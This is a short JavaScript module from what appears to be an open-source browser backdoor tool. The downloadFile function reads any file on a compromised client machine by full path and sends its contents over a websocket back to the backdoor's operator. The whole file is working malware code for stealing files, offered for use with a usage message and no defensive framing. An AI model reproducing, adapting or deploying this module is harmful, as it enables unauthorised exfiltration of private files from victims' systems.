// INTERACTIVE
/**
 * @file downloadFile Module
 * @summary Download a file from the client system.
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

fs = require('fs');

/**
 * @param {String} fullPath - The full path of the file to download.
 * @param {String} encoding - The encoding type of the data.
 * @return {String} |error|
 * @return {String} $data - The downloaded file.
 */
downloadFile = function (fullPath, encoding) {
    fs.readFile(fullPath, encoding, function (err, data) {
        if (err) {
            ws.send("Error downloading file: " + err.toString());
        } else {
            ws.send(data);
        }
    });
}

ws.send("\nUsage: downloadFile(fullPath, encoding)\n- fullPath is the properly escaped full path of the file.\n- encoding is a string of the encoding type of the data. E.g. \"utf8\".");
